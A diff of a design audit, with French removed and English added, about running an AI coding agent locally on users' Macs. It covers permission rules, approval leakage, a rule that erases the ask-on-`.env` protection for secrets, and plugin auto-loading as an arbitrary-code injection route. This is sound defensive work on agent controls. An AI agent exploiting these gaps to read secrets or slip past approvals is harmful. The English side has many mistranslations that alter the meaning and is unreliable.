-dans la même invocation que le lancement, donc **le cloud gagne toujours**. *Un
-ticket xl dont on ne peut rien vérifier avant que le suivant soit fait ne se livre
-pas.* Découpage proposé, chaque lot vérifiable seul :
+MIN-293 (xl, `null` plan, zero sub-issues) **blocks** MIN-294. But without MIN-294,
+no run ever reaches the machine — and `kickAgentDrain` leaves the cloud
+in the same invocation as the launch, so **the cloud always wins**. *A
+xl ticket of which nothing can be checked before the next one is made is delivered
+not.* Proposed breakdown, each batch verifiable alone:
 
-1. **Layout par run paramétré** — `REPO_DIR` & consorts sortent des constantes
-   (~21 fichiers, ~80 cas de test à réécrire). **Tout le reste est bloqué
-   derrière**, y compris les approbations : aujourd'hui `absoluteInRepo` lèverait
-   sur chaque `metadata.filepath` réel et refuserait **100 %** des écritures.
-2. **Deuxième voie d'admission + jeton**, avec un déclencheur de dev assumé qui
-   force un run local sans MIN-294.
-3. **Clé mintée et refus explicite.**
-4. **Worktree et identité git.**
-5. **Permissions et périmètre.**
+1. **Layout by parameterized run** — `REPO_DIR` & others output constants
+   (~21 files, ~80 test cases to rewrite). **Everything else is blocked
+   behind**, including approvals: today `absoluteInRepo` would raise
+   on each real `metadata.filepath` and would deny **100%** of writes.
+2. **Second admission path + token**, with an assumed dev trigger that
+   forces a local run without MIN-294.
+3. **Minted key and explicit refusal.**
+4. **Worktree and git identity.**
+5. **Permissions and scope.**
 
-Et corriger l'attribution : la présence, le claim et le repli appartiennent à
-**MIN-294**, pas à 293.
-
----
-
-## 9. Ce qu'il reste à mesurer avant de s'engager
-
-Quatre de ces sept points ont été mesurés depuis (MIN-362, 2026-08-15) et sont
-devenus des sondes ; les trois qui restent sont ceux qui portent encore un risque.
-
-- ✅ `action: "allow"` en **ruleset de session** : c'est une **vraie ACL** — il
-  lève l'`ask` de la config **sans** amputer le jeu de tools, là où le `deny` de
-  session l'ampute. La seule autorisation par session qui ne coûte pas un tool.
-- ✅ Le **système de permissions V2** : rien n'y passe. Ni
-  `/api/session/:id/permission`, ni `/api/permission/request`, ni
-  `/api/permission/saved` ne voient quoi que ce soit, même après un « toujours ».
-  La seule persistance native offerte est **inutilisable en 1.18.16**.
-- ✅ Une attente longue avec un **vrai fournisseur** : elle tient. 120 s de
-  demande pendante sur un round Haiku passé par le proxy, et le tour repart quand
-  on répond (`MDY_OPENCODE_WAIT_LIVE=1`).
-- ✅ Qu'un `core.hooksPath` posé sur le dépôt principal s'applique **depuis un
-  worktree** : **oui**. Le `config` est partagé par tous les worktrees, donc un
-  `git commit` lancé là exécute le `pre-commit` de l'utilisateur. Notre fin de
-  tour n'est pas concernée (plomberie), mais rien d'autre ne doit commiter
-  autrement. → [worktree-hooks.git.test.ts](../../lib/server/agent/worktree-hooks.git.test.ts)
-- `sandbox-exec` sous `utilityProcess.fork` : **la mesure qui change la valeur de
-  tout le reste** (§2). Toujours ouverte.
-- La présence de `OPENROUTER_PROVISIONING_KEY` **en production** — si elle manque,
-  le chemin local est mort-né.
-- Les sites d'appel de `skill`, `lsp`, `doom_loop`, `plan_enter`/`plan_exit`.
+And correct the attribution: the presence, the claim and the fallback belong to
+**MIN-294**, not 293.
 
 ---
 
-## 10. Dettes de documentation créées par cet audit
+## 9. What remains to measure before committing
 
-Cinq commentaires-contrats du dépôt deviennent **faux** et doivent être corrigés
-dans le lot qui les périme — c'est la classe d'erreur que ce dépôt combat partout
-ailleurs :
+Four of these seven points have been measured since (MIN-362, 2026-08-15) and are
+become probes; the three that remain are the ones that still carry a risk.
 
-| Fichier | Ce qui devient faux |
+- ✅ `action: "allow"` in **session ruleset**: it's a **real ACL** — it
+  raises the `ask` of the config **without** cutting the set of tools, where the `deny` of
+  session amputates it. The only authorization per session that does not cost a tool.
+- ✅ The **V2 permissions system**: nothing happens. Neither
+  `/api/session/:id/permission`, nor `/api/permission/request`, nor
+  `/api/permission/saved` doesn't see anything, even after an "always".
+  The only native persistence offered is **unusable in 1.18.16**.
+- ✅ A long wait with a **real supplier**: it lasts. 120 seconds
+  request pending on a Haiku round passed through the proxy, and the round restarts when
+  we respond (`MDY_OPENCODE_WAIT_LIVE=1`).
+- ✅ That a `core.hooksPath` placed on the main deposit applies **from a
+  worktree**: **yes**. The `config` is shared by all worktrees, so a
+  `git commit` launched there executes the user's `pre-commit`. Our end of
+  tower is not affected (plumbing), but nothing else should be committed
+  otherwise. → [worktree-hooks.git.test.ts](../../lib/server/agent/worktree-hooks.git.test.ts)
+- `sandbox-exec` under `utilityProcess.fork`: **the measure that changes the value of
+  everything else** (§2). Always open.
+- The presence of `OPENROUTER_PROVISIONING_KEY` **in production** — if it is missing,
+  the local path is stillborn.
+- The calling sites of `skill`, `lsp`, `doom_loop`, `plan_enter`/`plan_exit`.
+
+---
+
+## 10. Documentation debts created by this audit
+
+Five contract comments in the repository become **false** and need to be fixed
+in the batch that expires — this is the class of error that this repository fights everywhere
+elsewhere:
+
+| File | What becomes false |
 | --- | --- |
-| [opencode-permissions.ts:24-27](../../lib/server/agent/vm/opencode-permissions.ts#L24-L27) | « `bash: "ask"` demande pour TOUTE commande » — faux de `cd`, `cd .`, `popd` |
-| [opencode-permissions.ts:175-181](../../lib/server/agent/vm/opencode-permissions.ts#L175-L181) | « second rideau » — branche **jamais atteinte** |
-| [opencode-config.ts:56-60](../../lib/server/agent/vm/opencode-config.ts#L56-L60) | « `tools:{x:false}` n'enlève pas le tool » — en 1.18.16 c'est le `deny` qui l'enlève |
-| [opencode-config.ts:645](../../lib/server/agent/vm/opencode-config.ts#L645) | `OPENCODE_SHELL_CWD` n'existe pas dans le binaire |
-| [network-policy.ts:10-11](../../lib/server/agent/network-policy.ts#L10-L11), [vm/main.ts:25-28](../../lib/server/agent/vm/main.ts#L25-L28) | « la machine qui exécute ne détient aucun secret » — cesse d'être vrai |
+| [opencode-permissions.ts:24-27](../../lib/server/agent/vm/opencode-permissions.ts#L24-L27) | “`bash: "ask"` request for ANY order” — fake of `cd`, `cd .`, `popd` |
+| [opencode-permissions.ts:175-181](../../lib/server/agent/vm/opencode-permissions.ts#L175-L181) | “second curtain” — branch **never reached** |
+| [opencode-config.ts:56-60](../../lib/server/agent/vm/opencode-config.ts#L56-L60) | “`tools:{x:false}` does not remove the tool” — in 1.18.16 it is `deny` which removes it |
+| [opencode-config.ts:645](../../lib/server/agent/vm/opencode-config.ts#L645) | `OPENCODE_SHELL_CWD` does not exist in binary |
+| [network-policy.ts:10-11](../../lib/server/agent/network-policy.ts#L10-L11), [vm/main.ts:25-28](../../lib/server/agent/vm/main.ts#L25-L28) | “the executing machine holds no secrets” — ceases to be true |
 
-Et un manque de produit : **quand un run local rate vraiment** — avant que le
-harness ait parlé (bundle qui ne se lance pas, opencode qui n'installe pas,
-worktree impossible, TCC refusé, 403) — il n'existe **aucun log** : le `stdio`
-d'`utilityProcess` n'est câblé nulle part, et les logs d'opencode partent dans un
-dossier de la machine. C'est le premier ticket de support de la feature, et il
-sera insoluble. → capture du stdout/stderr dès le lanceur, et un geste « copier le
-rapport de diagnostic ».
+And a lack of product: **when a local run really fails** — before the
+harness has spoken (bundle which does not launch, opencode which does not install,
+worktree impossible, TCC refused, 403) — there is **no log**: the `stdio`
+of `utilityProcess` is not wired anywhere, and the opencode logs go to a
+machine folder. This is the first support ticket for the feature, and it
+will be insoluble. → capture the stdout/stderr from the launcher, and a “copy it” gesture
+diagnostic report”.
 
-> **FAIT (MIN-363, 2026-08-15) : cette dette est soldée.**
+> **FACT (MIN-363, 2026-08-15): this debt is paid.**
 >
-> - Les cinq commentaires ont été réécrits **là où ils sont lus** — les deux de
->   [opencode-permissions.ts](../../lib/server/agent/vm/opencode-permissions.ts)
->   (la mesure n°1, et le `case "external_directory"` qui est nommé branche morte
->   au lieu de « second rideau »), les trois de
->   [opencode-config.ts](../../lib/server/agent/vm/opencode-config.ts) : la
->   mesure n°4 dit maintenant qu'il y a **deux** catalogues, `list: "allow"` a
->   disparu (12 tools servis, pas de `list`), et `OPENCODE_SHELL_CWD` aussi (0
->   occurrence, revérifiée au `strings` sur `opencode-darwin-arm64`). Les deux
->   suppressions laissent derrière elles un commentaire qui dit **pourquoi la
->   ligne n'est pas là**, sans quoi la prochaine relecture la remettrait.
-> - La ligne « la machine qui exécute ne détient aucun secret » était **déjà**
->   corrigée par MIN-355/357/360 aux trois endroits (`network-policy.ts`,
->   `vm/main.ts`, le bloc `apiKey` d'`opencode-config.ts`), comme le paragraphe
->   `read *.env ask` de [harness-opencode.md](../harness-opencode.md). Vérifié,
->   rien à réécrire.
-> - **Le critère de bascule est réécrit** en tête du §4 de
->   [desktop-electron.md](../desktop-electron.md), avec ses quatre écarts assumés
->   et un renvoi vers D1/D2 pour les deux paragraphes que ces décisions périment.
-> - **Les journaux existent avant le lanceur** :
->   [lib/desktop/run-log.ts](../../lib/desktop/run-log.ts) (nommage daté et
->   triable, rotation à deux plafonds qui garde toujours le plus récent,
->   substitution des secrets à l'écriture, forme du rapport) avec son test, et
->   [desktop/src/run-log.ts](../../desktop/src/run-log.ts) pour le `fs`. Le
->   lanceur de MIN-293 n'a qu'à brancher les deux flux de son `utilityProcess`
->   sur `openRunLog(...).write` — l'en-tête du fichier montre les cinq lignes. Le
->   geste **Help → Copy Diagnostic Report** est en place, et il ne fait que
->   remplir le presse-papier : rien ne part tout seul.
+> - The five comments have been rewritten **where they are read** — the two from
+> [opencode-permissions.ts](../../lib/server/agent/vm/opencode-permissions.ts)
+> (measurement n°1, and the `case "external_directory"` which is called dead branch
+> instead of “second curtain”), the three of
+> [opencode-config.ts](../../lib/server/agent/vm/opencode-config.ts): the
+> measure #4 now says there are **two** catalogs, `list: "allow"` has
+> disappeared (12 tools used, no `list`), and `OPENCODE_SHELL_CWD` too (0
+> occurrence, rechecked at `strings` on `opencode-darwin-arm64`). Both
+> deletions leave behind a comment that says **why the
+> line is not there**, otherwise the next reread would put it back.
+> - The line “the executing machine holds no secrets” was **already**
+> corrected by MIN-355/357/360 in three places (`network-policy.ts`,
+> `vm/main.ts`, the `apiKey` block of `opencode-config.ts`), like the paragraph
+> `read *.env ask` from [harness-opencode.md](../harness-opencode.md). Checked,
+> nothing to rewrite.
+> - **The switchover criterion is rewritten** at the top of §4 of
+> [desktop-electron.md](../desktop-electron.md), with its four assumed deviations
+> and a reference to D1/D2 for the two paragraphs that these decisions expire.
+> - **Logs exist before the launcher**:
+> [lib/desktop/run-log.ts](../../lib/desktop/run-log.ts) (dated naming and
+> sortable, rotation with two caps which always keeps the most recent,
+> substitution of secrets in writing, form of the report) with its test, and
+> [desktop/src/run-log.ts](../../desktop/src/run-log.ts) for the `fs`. The
+> MIN-293 launcher only needs to connect the two sound streams `utilityProcess`
+> on `openRunLog(...).write` — the file header shows all five lines. The
+> gesture **Help → Copy Diagnostic Report** is in place, and it only does
+> fill the clipboard: nothing goes away by itself.
 
 ---
 
-## 11. « Et si Numo n'était qu'un wrapper d'opencode ? »
+## 11. “What if Numo was just an opencode wrapper? »
 
-Question posée après le premier audit. Quatorze agents : six inventaires du
-partage délégué/forcé, quatre thèses de délégation, quatre contradicteurs.
+Question asked after the first audit. Fourteen agents: six inventories of
+delegated/forced sharing, four delegation theses, four contradictors.
 
-### 11.1 Le partage aujourd'hui
+### 11.1 Sharing today
 
-**La grande délégation a déjà eu lieu**, et elle a coûté 18 100 lignes en moins
-(`agent-loop.ts`, 2 305 l., et `subagent.ts`, 1 066 l., supprimés — cf.
-[harness-opencode.md](../harness-opencode.md) §2.31). Sont déjà à opencode : la
-boucle de rounds, l'appel modèle, le streaming, les retries, la compaction du
-contexte, les tools de fichier et de shell, les sous-agents, le prompt système,
-le critère de fin de tour (`session.idle`), et **l'historique de la conversation**
-— le checkpoint de minddy part littéralement avec `messages: []`.
+**The big delegation has already taken place**, and it cost 18,100 lines less
+(`agent-loop.ts`, 2,305 l., and `subagent.ts`, 1,066 l., deleted — cf.
+[harness-opencode.md](../harness-opencode.md) §2.31). Are already in opencode: the
+loop of rounds, model calling, streaming, retries, compaction of the
+context, file and shell tools, subagents, system prompt,
+the end of turn criterion (`session.idle`), and **conversation history**
+— minddy's checkpoint literally leaves with `messages: []`.
 
-Ce que minddy garde se range en trois familles, et **elles ne se valent pas** :
+What Minddy keeps falls into three families, and **they are not the same**:
 
-| Famille | Exemples | Délégable ? |
+| Family | Examples | Delegable? |
 | --- | --- | --- |
-| **Produit** | le fil (`opencode-events.ts`, 768 l.), les ~37 tools de domaine, le ledger, la porte de livraison, le commit et la PR | Non. C'est minddy. |
-| **Ce qu'opencode ne sait pas faire** | le ledger par round (opencode ne publie ni `generation_id` ni le coût facturé, et **ne facture rien d'un round avorté** alors que le fournisseur, lui, facture), le Stop et le steering, l'échéance de tour | Non. |
-| **Mécanique d'hébergement** | l'export/rejeu du journal, le battement de cœur, le redémarrage du serveur à chaque tour | **Oui — et c'est la seule.** |
+| **Product** | the thread (`opencode-events.ts`, 768 l.), the ~37 domain tools, the ledger, the delivery gate, the commit and the PR | No. It's Mindy. |
+| **What opencode can't do** | the ledger per round (opencode publishes neither `generation_id` nor the invoiced cost, and **does not invoice anything for an aborted round** while the supplier invoices), the Stop and the steering, the turn deadline | No. |
+| **Hosting mechanics** | log export/replay, heartbeat, server restart every round | **Yes — and it's the only one.** |
 
-### 11.2 Les quatre thèses
+### 11.2 The four theses
 
-| Thèse | Verdict | Ce que la contradiction en a laissé |
+| Thesis | Verdict | What the contradiction has left |
 | --- | --- | --- |
-| **Session vivante** — le serveur survit entre les tours | **la seule qui rende** | Le gain est réel mais **sur-compté** (voir 11.3) |
-| **Permissions natives** — déléguer l'arbitrage aux règles d'opencode | **partiellement, et surtout pas pour la sécurité** | **Opencode n'a pas d'UI d'approbation : il n'a qu'un protocole.** Son écran, c'est son TUI, qu'on ne lance pas. La fenêtre d'approbation, **on l'écrit dans tous les cas.** Et ~536 des 1 140 lignes annoncées comme supprimables ne peuvent pas partir : `command-guard` est aussi appelé par `run_background` (un tool minddy qu'opencode ne voit jamais), `repo-path` par les mains du harness. |
-| **Tools par MCP** — le pont local devient notre serveur MCP | **à ne pas faire** | **Le transport n'est pas l'arbitrage.** MIN-293 porte entièrement sur l'arbitrage des tools **intégrés** ; nos tools de domaine ne passent par **aucun** de ces mécanismes. Zéro ligne de `opencode-permissions.ts` ne bouge. Et ça rouvrirait MIN-326 (le verrou d'ancrage), casserait l'attribution (`run.created_by` → « <client> (mcp) »), et partagerait le plafond de 120 req/min avec le Claude Code de l'utilisateur. |
-| **Lancer l'opencode de l'utilisateur** | **non** | On perdrait le **ledger** (notre provider déclare `cost` modèle par modèle ; un modèle déclaré sans `cost` fait rendre `cost: 0`), la **version épinglée** — or [harness-opencode.md](../harness-opencode.md) est un carnet de mesures **sur ce binaire**, pas sur une API publique — et le contrôle de ce qu'opencode lit. |
+| **Live session** — server survives between rounds | **the only one who gives back** | The gain is real but **over-counted** (see 11.3) |
+| **Native permissions** — delegate arbitration to opencode rules | **partially, and especially not for security** | **Opencode does not have an approval UI: it only has a protocol.** Its screen is its TUI, which we do not launch. The approval window, **we write it in all cases.** And ~536 of the 1,140 lines announced as deletable cannot leave: `command-guard` is also called by `run_background` (a minddy tool that opencode never sees), `repo-path` by the hands of the harness. |
+| **Tools by MCP** — the local bridge becomes our MCP server | **not to do** | **Transportation is not arbitration.** MIN-293 is entirely about arbitration of **integrated** tools; our domain tools do not go through **any** of these mechanisms. Zero lines of `opencode-permissions.ts` move. And that would reopen MIN-326 (the anchor lock), break the grant (`run.created_by` → “<client> (mcp)”), and share the 120 req/min cap with the user's Claude Code. |
+| **Run user opencode** | **no** | We would lose the **ledger** (our provider declares `cost` model by model; a model declared without `cost` renders `cost: 0`), the **pinned version** - or [harness-opencode.md](../harness-opencode.md) is a logbook **on this binary**, not on a public API - and the control of what opencode reads. |
 
-### 11.3 Le gain réel, une fois la contradiction passée
+### 11.3 The real gain, once the contradiction has passed
 
-La thèse annonçait **~1 700 lignes** supprimées. **Le contradicteur a raison de
-la rabattre**, et pour la raison exacte que le PO redoutait — *du travail déplacé
-compté comme du travail supprimé* :
+The thesis announced **~1,700 lines** deleted. **The opponent is right to
+fold it back**, and for the exact reason the OP feared — *displaced work
+counted as work deleted*:
 
-- **`drain.ts` (456 l.), `network-policy.ts` (270 l.), l'adaptateur sandbox : ne
-  disparaissent pas.** Le §7 de cet audit pose un invariant — un run d'ancrage
-  `pr`, de webhook, de routine, de chaîne ou de board public **ne part jamais en
-  local**, et le BYOK non plus. **Le chemin cloud ne meurt pas.** Ces fichiers
-  deviennent une branche sur deux, pas du code mort.
-- **Les comptages sont gonflés** : les plages citées pour le journal donnent
-  **83 lignes**, pas « ~180 » ; `appendRunJournal` + `loadRunJournal` font **49
-  lignes**, pas « ~130 ».
-- **`opencode-host.ts` ne disparaît pas** : il change de propriétaire et de
-  fréquence (une opération d'installation de l'app au lieu d'un coût par tour).
-  Et son comportement actuel — l'enfant meurt avec nous — **est un invariant
-  écrit et motivé** (« pas de serveur orphelin entre deux tours »), pas un oubli.
+- **`drain.ts` (456 l.), `network-policy.ts` (270 l.), sandbox adapter: does not
+  do not disappear.** §7 of this audit poses an invariant — an anchor run
+  `pr`, webhook, routine, channel or public board **never leaves
+  local**, and BYOK neither. **Cloud path does not die.** These files
+  become every other branch, not dead code.
+- **The counts are inflated**: the ranges cited for the journal give
+  **83 lines**, not “~180”; `appendRunJournal` + `loadRunJournal` is **49
+  lines**, not “~130”.
+- **`opencode-host.ts` does not disappear**: it changes owner and
+  frequency (an app installation operation instead of a cost per turn).
+  And his current behavior — the child dies with us — **is an invariant
+  written and motivated** (“no orphan server between two rounds”), not an oversight.
 
-**Ce qui reste, et qui est vrai :**
+**What remains, and which is true:**
 
-1. **L'export/rejeu du journal sort** — `syncJournal`, `syncHistory`/`syncReplay`,
-   la table `agent_run_journal`, la route `POST /journal`, sa purge. Sa raison
-   d'être est écrite dans le code : *« c'est ce qui rend un tour indépendant de la
-   microVM qui l'a précédé »* ([supervisor.ts:506](../../lib/server/agent/vm/supervisor.ts#L506)).
-   Vérifié par grep : cette table a **exactement un lecteur** dans tout le dépôt.
-   **Et c'est une décision de confidentialité avant d'être une économie de code** :
-   c'est elle qui ferait monter le contenu de fichiers personnels dans la base de
+1. **Log export/replay exits** — `syncJournal`, `syncHistory`/`syncReplay`,
+   the `agent_run_journal` table, the `POST /journal` route, its purge. His reason
+   to be is written in the code: *“this is what makes a turn independent of the
+   microVM that preceded it »* ([supervisor.ts:506](../../lib/server/agent/vm/supervisor.ts#L506)).
+   Checked by grep: this table has **exactly one drive** in the entire repository.
+   **And it's a confidentiality decision before being a code saving**:
+   it is she who would bring up the contents of personal files in the database
    prod (§6).
-2. **`ask_user` cesse d'être terminal.** Aujourd'hui minddy `reject`e la question
-   et **coupe le tour**, la réponse revenant au tour suivant par le steering. Le
-   commentaire dit pourquoi : *« tenir une microVM ouverte le temps qu'un humain
-   revienne coûterait des heures de compute »*. **Ce motif tombe sur le Mac.**
-   `POST /question/:id/reply` bloque sans timeout et ne termine pas le tour. On
-   supprime le détour le plus tordu du harness — une réponse d'humain qui revient
-   déguisée en message de steering.
-3. **Le « toujours » cesse de valoir un tour** (mesure n°8) — mais voir 11.4.
-4. **Le callId mort** (mesure n°5) cesse d'être l'ordinaire : le problème n'existe
-   que parce qu'on tue le process. Il reste sur ⌘Q et sur un crash.
+2. **`ask_user` stops being terminal.** Today minddy `reject`e the question
+   and **cuts the turn**, the response coming back to the next turn via the steering. The
+   comment says why: *“keep a microVM open for as long as a human
+   coming back would cost hours of compute”*. **This pattern falls on the Mac.**
+   `POST /question/:id/reply` blocks without timeout and does not end the round. We
+   removes the most twisted detour of the harness - a human response that returns
+   disguised as a steering message.
+3. **The “always” ceases to be worth a turn** (measure no. 8) — but see 11.4.
+4. **The dead callId** (measure no. 5) ceases to be the ordinary: the problem does not exist
+   only because we kill the process. He stays on ⌘Q and crashes.
 
-### 11.4 Ce qui EMPIRE si la session survit
+### 11.4 What WORSE if the session survives
 
-- **Le `always` fuit entre sessions** (mesuré). Aujourd'hui, le redémarrage du
-  serveur à chaque tour est ce qui **contient** la fuite. Un serveur qui vit
-  longtemps, c'est un « oui » donné sur le ticket A qui s'applique au ticket B.
-  **La thèse supprime un garde-fou accidentel sans le remplacer.**
-- Et le grain ne change pas : `always` sur `edit` porte `*`, `*` traverse les `/`,
-  un `always` humain écrase un `deny` de config. **Faire durer plus longtemps un
-  mécanisme trop grossier, sur le disque de l'utilisateur, aggrave le problème.**
-- **Le §5.7 devient immédiat** : `OPENCODE_PORT`, `OPENCODE_DB_PATH`, les XDG sont
-  des constantes globales. Un serveur unique tenu par l'app, c'est **une seule
-  base SQLite pour tous les tickets**.
+- **The `always` leaks between sessions** (measured). Today, the restart of
+  server each turn is what **contains** the leak. A server who lives
+  for a long time, it is a “yes” given on ticket A that applies to ticket B.
+  **The thesis removes an accidental guardrail without replacing it.**
+- And the grain does not change: `always` on `edit` carries `*`, `*` crosses the `/`,
+  a human `always` overwrites a config `deny`. **Make one last longer
+  too crude a mechanism, on the user's disk, aggravates the problem.**
+- **§5.7 becomes immediate**: `OPENCODE_PORT`, `OPENCODE_DB_PATH`, the XDGs are
+  global constants. A single server run by the app is just one
+  SQLite database for all tickets**.
 
-Le vrai remède au « toujours » n'est donc pas la survie du serveur : c'est le
-**ruleset par session** (`POST /session {permission: […]}`), qui transforme un oui
-humain en règle durable à un grain qu'on choisit. Mesuré depuis : un ruleset en
-`allow` **n'ampute pas** le catalogue (contrairement au `deny`), et une règle de
-motif en `deny` n'ampute pas non plus — `disabled` ne coupe que si la dernière
-règle qui matche a `pattern === "*"`. **Mais** notre client ne connaît que
-`createSession(title?)` : une règle posée à la **création** ne peut pas exprimer
-un « Toujours » cliqué **en cours de tour**. La route de mise à jour reste à
-vérifier.
+The real remedy for “always” is therefore not the survival of the server: it is the
+**ruleset per session** (`POST /session {permission: […]}`), which transforms a yes
+human in lasting rule to a grain that we choose. Measured from: a ruleset in
+`allow` **does not cut** the catalog (unlike `deny`), and a rule of
+pattern in `deny` does not cut either — `disabled` only cuts if the last
+rule that matches `pattern === "*"`. **But** our client only knows
+`createSession(title?)`: a rule set at **creation** cannot express
+“Always” clicked **during the tour**. The update route remains at
+check.
 
-### 11.5 Deux correctifs qui ne dépendent d'aucune de ces thèses
+### 11.5 Two fixes which do not depend on any of these theses
 
-**`read: "allow"` neutralise une protection livrée par opencode.** Le ruleset par
-défaut du binaire porte `read: {"*":"allow", "*.env":"ask", "*.env.*":"ask",
-"*.env.example":"allow"}`. Nos règles étant concaténées **après** et le dernier
-match gagnant, notre `read: "allow"` **efface la question sur les `.env`**. Sans
-conséquence dans une microVM jetable. **Grave sur le disque de l'utilisateur.**
-Trois précisions qui changent le geste :
+**`read: "allow"` neutralizes a protection provided by opencode.** The ruleset by
+binary default carries `read: {"*":"allow", "*.env":"ask", "*.env.*":"ask",
+"*.env.example":"allow"}`. Our rules being concatenated **after** and the last
+winning match, our `read: "allow"` **deletes the question on `.env`**. Without
+consequence in a disposable microVM. **Burned to the user's disk.**
+Three details that change the gesture:
 
-- il est écrit **deux fois** — [opencode-config.ts:328](../../lib/server/agent/vm/opencode-config.ts#L328)
-  et **:530**, ce second littéral étant celui des sous-agents `explore`,
-  c'est-à-dire précisément ceux dont le métier est de lire ;
-- le retirer seul **ne gagne rien** : `read` remonterait alors à
-  `decidePermission`, dont le `switch` ne connaît que `task`/`bash`/`edit`/
-  `external_directory` — et tomberait sur `default: return ALLOW` ;
-- le cadrage prévoit par ailleurs de **recopier les `.env` exprès** dans le
-  worktree (§4.3). Les deux décisions doivent être prises ensemble.
+- it is written **twice** — [opencode-config.ts:328](../../lib/server/agent/vm/opencode-config.ts#L328)
+  and **:530**, this second literal being that of the `explore` sub-agents,
+  that is to say precisely those whose job is to read;
+- remove it alone **nothing gained**: `read` would then go back to
+  `decidePermission`, whose `switch` only knows `task`/`bash`/`edit`/
+  `external_directory` — and would come across `default: return ALLOW`;
+- the framework also provides for **copying the express `.env`** in the
+  worktree (§4.3). Both decisions must be made together.
 
-**Opencode auto-découvre des plugins dans le dépôt.** Il charge tout `*.ts` sous
-`.opencode/plugin(s)/` et remonte depuis le cwd chercher un `opencode.json` — et
-minddy ne pose **aucune** des écoutilles qui le désactiveraient. Dans une microVM
-jetable, c'est sans enjeu. **Sur un Mac, c'est de l'exécution de code arbitraire
-depuis le contenu d'un dépôt**, donc un vecteur d'injection qui contourne
-entièrement le modèle de permissions. À fermer avant tout run local.
+**Opencode auto-discovers plugins in the repository.** It loads everything `*.ts` under
+`.opencode/plugin(s)/` and go back from the cwd to look for a `opencode.json` — and
+minddy doesn't lay **any** of the hatches that would disable him. In a microVM
+disposable, it's no problem. **On a Mac, this is arbitrary code execution
+from the content of a repository**, therefore an injection vector which bypasses
+completely the permissions model. To be closed before any local run.
 
-### 11.6 Réponse au PO
+### 11.6 Response to OP
 
-*« Numo n'est-il pas déjà un wrapper d'opencode, et lâcher plus de terrain ne
-simplifierait-il pas le local ? »*
+*“Isn't Numo already an opencode wrapper, and giving up more ground doesn't
+wouldn't it simplify the premises? »*
 
-Numo **est** déjà un wrapper — la grande délégation a eu lieu et a coûté 18 100
-lignes. Ce qui reste autour n'est pas du gras : c'est le produit (le fil, les
-tickets, le ledger, la PR) et ce qu'opencode ne sait pas faire (la facture, le
-Stop, l'horloge). **Lâcher davantage ne réduit pas ce travail, ça le déplace.**
+Numo **is** already a wrapper — the big delegation took place and cost 18,100
+lines. What remains around is not fat: it is the product (the thread, the
+tickets, the ledger, the PR) and what opencode cannot do (the invoice, the
+Stop, clock). **Releasing more does not reduce this work, it shifts it.**
 
-Ce qui simplifie le local, c'est **la fin d'une contrainte, pas un transfert de
-responsabilité** : la microVM mourait à chaque tour, donc minddy reconstruisait
-l'état. Sur un Mac, il n'y a plus rien à reconstruire.
+What simplifies the premises is **the end of a constraint, not a transfer of
+responsibility**: the microVM was dying at every turn, so minddy was rebuilding
+the state. On a Mac, there is nothing left to rebuild.
 
-**Et cette simplification ne touche presque aucun des points durs du §2 au §7.**
-Le mur de papier, la fatigue d'approbation, la cascade de refus, l'ordre des
-règles, les trois verrous, le chien de garde, TCC, le scan de secrets : intacts.
-**La délégation est une bonne économie de code, pas une réponse au chantier.**
+**And this simplification hardly touches any of the hard points from §2 to §7.**
+The wall of paper, approval fatigue, the cascade of refusals, the order of
+rules, the three locks, the watchdog, TCC, the secret scan: intact.
+**Delegation is a good code saving, not a worksite response.**
 
 ---
 
-## 12. Décisions du product owner (2026-08-14)
+## 12. Product owner decisions (2026-08-14)
 
-Quatre décisions prises après lecture de cet audit. Elles **réduisent fortement**
-le périmètre — la moitié des points durs des §2 et §3 sortent de la v1.
+Four decisions taken after reading this audit. They **reduce significantly**
+the perimeter — half of the hard points in §2 and §3 come out of v1.
 
-### D1. L'environnement se choisit au début et ne change plus
+### D1. The environment is chosen at the beginning and no longer changes
 
-Sélecteur cloud/local sur la page de l'agent, **au début d'une conversation**,
-figé ensuite — comme `agent_runs.agent_engine`, et pour la même raison écrite
-(« chaque moteur relit SA mémoire dans le checkpoint »).
+Cloud/local selector on the agent page, **at the start of a conversation**,
+then frozen — like `agent_runs.agent_engine`, and for the same reason written
+(“each engine rereads ITS memory in the checkpoint”).
 
-**Conséquence directe : le repli cloud en cours de conversation du §4.5 du
-cadrage n'existe pas.** Un repli ne peut avoir lieu qu'**avant le premier tour**.
-Ça retire du dossier la bascule à chaud, son rejeu de journal et sa contradiction
-avec la doctrine du moteur.
+**Direct consequence: the cloud fallback during the conversation in §4.5 of
+framing does not exist.** A withdrawal can only take place **before the first round**.
+This removes from the file the hot switch, its log replay and its contradiction
+with the engine doctrine.
 
-### D2. Par défaut, l'agent travaille dans le dépôt courant ; le worktree dédié est une option
+### D2. By default, the agent works in the current repository; the dedicated worktree is an option
 
-Renverse le §4.3 du cadrage et la recommandation du §4 de cet audit. Motif
-produit : c'est ce que fait Claude Code — session dans le checkout courant par
-défaut, worktree dédié sur demande.
+Reverses §4.3 of the framework and the recommendation of §4 of this audit. Pattern
+product: this is what Claude Code does — session in the current checkout by
+default, dedicated worktree on request.
 
-**Ce que ça supprime**, et c'est substantiel : la gestion des worktrees, le
-réglage explicite de recopie des `.env` (ils sont déjà là), le coût
-d'installation du premier tour, le nettoyage et la purge, l'accumulation des
-snapshots `opencode/repos/`. **Tout le §4.3 du cadrage s'évapore.**
+**What it removes**, and it's substantial: the management of worktrees, the
+explicit setting for copying `.env` (they are already there), the cost
+installation of the first round, cleaning and purging, accumulation of
+`opencode/repos/` snapshots. **All of §4.3 of the framing evaporates.**
 
-**Ce que ça oblige**, en revanche, et qui n'est pas optionnel : la chaîne de fin
-de tour ne peut pas rester ce qu'elle est. Trois gestes détruisent du travail
-humain dans un checkout partagé :
+**What it requires**, on the other hand, and which is not optional: the end string
+tower cannot remain what it is. Three actions destroy work
+human in a shared checkout:
 
-| Geste | Ancrage | Ce qu'il fait au checkout de l'humain |
+| Gesture | Anchoring | What it does at the human checkout |
 | --- | --- | --- |
-| `git add -A` | [repo-host.ts:334](../../lib/server/agent/repo-host.ts#L334) | Stage **tout** le non-ignoré : le WIP de l'humain part dans la PR |
-| `git checkout -b` | [repo-host.ts:169](../../lib/server/agent/repo-host.ts#L169) | Change sa branche sous ses doigts |
-| `git config user.email/user.name` | [repo-host.ts:163-164](../../lib/server/agent/repo-host.ts#L163-L164), :248-249 | Réécrit **son** identité git dans **son** dépôt (mesuré) |
+| `git add -A` | [repo-host.ts:334](../../lib/server/agent/repo-host.ts#L334) | Internship **all** the unignored: the human WIP goes to PR |
